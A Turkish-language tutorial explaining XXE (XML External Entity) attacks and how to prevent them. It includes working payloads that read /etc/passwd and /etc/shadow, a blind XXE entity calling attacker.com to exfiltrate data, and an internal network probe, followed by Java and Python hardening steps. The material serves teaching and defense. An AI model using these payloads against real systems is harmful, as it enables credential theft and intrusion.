# XXE (XML External Entity) Nedir?

**XXE (XML External Entity)**, XML verisinin işlendiği sistemlerde, kötü niyetli aktörlerin XML dosyası içinde tanımlanmış harici bir varlığı (**external entity**) kullanarak hassas dosyalara erişim sağlaması, kod yürütmesi veya hizmet reddine (DoS) neden olmasıdır. XXE saldırıları genellikle güvenlik önlemleri eksik olan XML işleyicilerinden kaynaklanır.

---

## Temel Örnek

Aşağıdaki XML, basit bir XXE saldırısı örneğidir. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Açıklama:**
- `<!ENTITY xxe SYSTEM "file:///etc/passwd">`: `xxe` isimli bir harici varlık tanımlar ve sistemden `/etc/passwd` dosyasını yüklemeye çalışır.
- `<productId>&xxe;</productId>`: Tanımlanan harici varlığı çağırır ve sunucuda belirtilen dosyanın içeriğini XML yanıtına ekler.

**Beklenen Etki:**
Sunucu, `/etc/passwd` dosyasının içeriğini döndürebilir, böylece saldırgan hassas bilgiler elde eder.

---

## Daha İleri Seviye XXE Payload'ları

### 1. **Sunucu Dosyalarına Erişim**

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Amaç:**
- Bu payload, Linux sisteminde kullanıcı şifrelerinin hash'lerini saklayan `etc/shadow` dosyasına erişmeye çalışır.

**Risk:**
- Erişim sağlanması durumunda, saldırgan brute force veya hash kırma araçlarıyla kullanıcı şifrelerini çözebilir.

### 2. **Harici Sunucu ile İletişim (Blind XXE)**

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious-data"> 
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Amaç:**
- Harici bir sunucuya (ör. saldırganın kontrolündeki `attacker.com`) veri sızdırmak veya sistemin ağ içinde hangi kaynaklara erişebileceğini keşfetmek.

**Senaryo:**
- Eğer sunucu dış bağlantılara izin veriyorsa, bu saldırı hassas bilgilerin (örn. erişim token'ları veya sistem yapılandırma bilgileri) harici sunucuya gönderilmesine neden olabilir.

### 3. **Ağ İçi Keşif ve Port Taraması**

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> 
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Amaç:**
- Sunucunun ağ içinde hangi dahili sistemlere erişebildiğini belirlemek.
- Dahili sunucu hizmetlerini keşfetmek (örn. `http://internal.vulnerable-website.com`).

**Risk:**
- Dahili hizmetlere erişim sağlanırsa, saldırgan sistemler arasında zafiyet arayabilir.

---

## XXE Önleme Yöntemleri

1. **Dış Varlıkları Devre Dışı Bırakma**
   - XML işlemcisinde harici varlıkları devre dışı bırakmak en etkili yöntemlerden biridir.
   - Örneğin, Java'da harici varlıkları devre dışı bırakmak:
     ```java
     DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
     dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
     dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
     dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
     ```

2. **Güvenli XML İşleme Kütüphaneleri Kullanma**
   - Harici varlıkları varsayılan olarak devre dışı bırakan güvenli kütüphaneler tercih edilmelidir (örn. `defusedxml` Python için).

3. **Input Doğrulama ve Filtreleme**
   - Kullanıcıdan gelen XML girişini doğrulamak ve potansiyel zararlı içerikleri filtrelemek.

4. **XML Yerine JSON Kullanımı**
   - Mümkünse, JSON gibi daha az karmaşık ve daha güvenli veri formatlarına geçiş yapılabilir.

---

## Özet
XXE saldırıları, zayıf yapılandırılmış XML işleyicilerinde ciddi güvenlik riskleri oluşturur. Bu zafiyetleri anlamak ve önleyici önlemler almak, uygulama güvenliği açısından kritik öneme sahiptir.
